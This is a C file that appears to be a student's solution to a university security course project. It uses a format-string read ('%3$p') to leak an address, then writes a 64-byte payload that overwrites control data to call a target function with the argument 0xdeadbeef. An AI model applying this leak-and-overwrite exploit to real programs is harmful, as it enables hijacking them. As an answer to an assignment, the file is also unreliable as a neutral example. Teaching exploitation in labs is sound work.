/*
 * CMSC 414, Section 0201
 * Fall 2020
 * Project 1 | task1
 *
 * Build instructions:
 *   We will be building this with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 * Submission instructions:
 *   Submit this file.
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS

#include <stdint.h>

#define BUFFER_SIZE 64

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    fprintf(stderr, "send debug statements to stderr\n");

    /* you may change this string */
    char greeting[128] = "%3$p\n";
    
    write(STDOUT_FILENO, greeting, sizeof(greeting) - 1);

    /* you may do whatever you want with the response */
    char response[512];
    fgets(response, sizeof(response), stdin);
    //fprintf(stderr, response);
    int sensitive_function_address = ((int)strtol(response, NULL, 0))-0x6f-0xf;
    unsigned char bytes[4];
    unsigned char arg[4];
    unsigned long n = sensitive_function_address;

    bytes[3] = (n >> 24) & 0xFF;
    bytes[2] = (n >> 16) & 0xFF;
    bytes[1] = (n >> 8) & 0xFF;
    bytes[0] = n & 0xFF;

    arg[0] = 0xef;
    arg[1] = 0xbe;
    arg[2] = 0xad;
    arg[3] = 0xde;
    //fprintf(stderr,"%x\n",n);
    for(int i = 0 ; i < 48 ; i++)
    {
        buffer[i] = bytes[i%4];
    }
    int cnt = 0;
    for(int i = 48 ; i < BUFFER_SIZE ; i++)
    {
        buffer[i] = arg[cnt%4];
        cnt++;
    }
    write(STDOUT_FILENO, buffer, BUFFER_SIZE);

    return EXIT_SUCCESS;
}
